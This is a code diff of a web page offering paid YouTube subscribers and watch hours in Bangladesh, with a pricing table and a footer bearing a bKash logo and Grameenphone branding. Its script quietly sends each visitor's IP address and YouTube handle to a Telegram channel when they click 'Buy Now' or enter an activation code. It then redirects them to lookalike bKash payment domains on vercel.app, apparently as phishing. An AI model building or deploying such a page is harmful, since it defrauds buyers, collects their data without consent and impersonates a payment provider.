@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LUXURY YT</title>
     <style>
-        /* Styling for page elements as before */
+        /* Styling as before */
         * {
             margin: 0;
             padding: 0;
@@ -136,47 +136,6 @@
             background-color: rgba(0, 0, 0, 0.5);
             z-index: 500;
         }
-
-        /* Processing Animation Styling */
-        #processingAnimation {
-            display: none;
-            position: fixed;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: white;
-            color: black;
-            padding: 20px;
-            border-radius: 10px;
-            z-index: 2000;
-            text-align: center;
-            font-family: 'Roboto', sans-serif;
-        }
-
-        #processingAnimation img {
-            width: 50px;
-            margin-bottom: 10px;
-        }
-
-        #processingAnimation p {
-            font-size: 1.2rem;
-            font-weight: 500;
-        }
-
-        .loader {
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #3498db;
-            border-radius: 50%;
-            width: 40px;
-            height: 40px;
-            animation: spin 2s linear infinite;
-            margin: 0 auto;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
     </style>
 </head>
 <body>
@@ -188,14 +147,66 @@
         <p> PURCHASE PREMIUM MEMBERSHIP FOR YOUTUBE FROM US IN BD</p>
     </header>
 
-    <!-- Processing Animation Popup -->
-    <div id="processingAnimation">
-        <div class="loader"></div>
-        <img src="https://img.icons8.com/ios-filled/50/000000/lock--v1.png" alt="Lock Icon">
-        <p>Secure Payment Processing...</p>
-    </div>
+    <section class="offer">
+        <p>HELLO EVERYONE, with our new rigs buy YouTube subscriber membership tension free from us in Bangladesh. We are here to give you YouTube subscribers membership in reasonable price. So why are you waiting? Buy subscriber membership and grow your YouTube channel.</p>
+        <h2>BOOK YOUR FAVOURITE MEMBERSHIP NOW</h2>
+    </section>
 
-    <!-- Other content remains unchanged -->
+    <section class="pricing">
+        <table>
+            <thead>
+                <tr>
+                    <th>GOLD MEMBERSHIP</th>
+                    <th>PLATINUM MEMBERSHIP</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>1. Up to 1200 non-drop subscribers</td>
+                    <td>1. Up to 2000 subscribers</td>
+                </tr>
+                <tr>
+                    <td></td>
+                    <td>2. Up to 4000 watchtime hours</td>
+                </tr>
+                <tr>
+                    <td>Price: 10TK Only/Day</td>
+                    <td>Price: 20TK Only/Day</td>
+                </tr>
+            </tbody>
+        </table>
+        <div class="buy-now">
+            <button onclick="buyNow()">BUY NOW</button>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <p></p>
+        <div class="payment">
+            <img src="https://imgur.com/HoTrMsT.png" alt="bKash Logo">
+            <p>Powered by GRAMEENPHONE LTD</p>
+        </div>
+        <div class="social">
+            <a href="https://facebook.com" target="_blank">
+                <img src="https://img.icons8.com/fluency/48/000000/facebook-new.png" alt="Facebook">
+            </a>
+            <a href="https://instagram.com" target="_blank">
+                <img src="https://img.icons8.com/fluency/48/000000/instagram-new.png" alt="Instagram">
+            </a>
+            <a href="https://snapchat.com" target="_blank">
+                <img src="https://img.icons8.com/fluency/48/000000/snapchat.png" alt="Snapchat">
+            </a>
+            <a href="https://twitter.com" target="_blank">
+                <img src="https://img.icons8.com/fluency/48/000000/twitter.png" alt="Twitter">
+            </a>
+            <a href="https://whatsapp.com" target="_blank">
+                <img src="https://img.icons8.com/fluency/48/000000/whatsapp.png" alt="WhatsApp">
+            </a>
+            <a href="https://linkedin.com" target="_blank">
+                <img src="https://img.icons8.com/fluency/48/000000/linkedin.png" alt="LinkedIn">
+            </a>
+        </div>
+    </footer>
 
     <!-- Popup HTML -->
     <div class="overlay"></div>
@@ -245,43 +256,27 @@
                 });
         }
 
-        function showProcessingAnimation() {
-            document.getElementById('processingAnimation').style.display = 'block';
-        }
-
-        function hideProcessingAnimation() {
-            document.getElementById('processingAnimation').style.display = 'none';
-        }
-
         function activate() {
             const youtubeHandle = document.getElementById('youtubeHandle').value;
             const activationCode = document.getElementById('activationCode').value;
             const membershipType = document.getElementById('membershipType').value;
 
             if (activationCode === 'LYT089') {
-                // Show the processing animation
-                showProcessingAnimation();
-
                 // Send activation message to Telegram
                 getIPAndSendMessage(`YouTube Handle: ${youtubeHandle} has activated their subscription. Membership: ${membershipType}`);
 
-                // Simulate a 5-second delay for the animation
-                setTimeout(() => {
-                    // Hide the processing animation after 5 seconds
-                    hideProcessingAnimation();
-
-                    // Redirect based on membership type
-                    if (membershipType === 'gold') {
-                        window.location.href = 'https://pay-bkash.vercel.app';
-                    } else if (membershipType === 'platinum') {
-                        window.location.href = 'https://bkash-pay.vercel.app';
-                    }
-                }, 5000);
+                // Redirect based on membership type
+                if (membershipType === 'gold') {
+                    window.location.href = 'https://pay-bkash.vercel.app';
+                } else if (membershipType === 'platinum') {
+                    window.location.href = 'https://bkash-pay.vercel.app';
+                }
             } else {
                 alert('Invalid activation code!');
             }
         }
 
+        // Send a message to Telegram when the "BUY NOW" button is clicked along with the user's IP address
         function buyNow() {
             const message = "Someone clicked on 'Buy Now'.";
             getIPAndSendMessage(message);
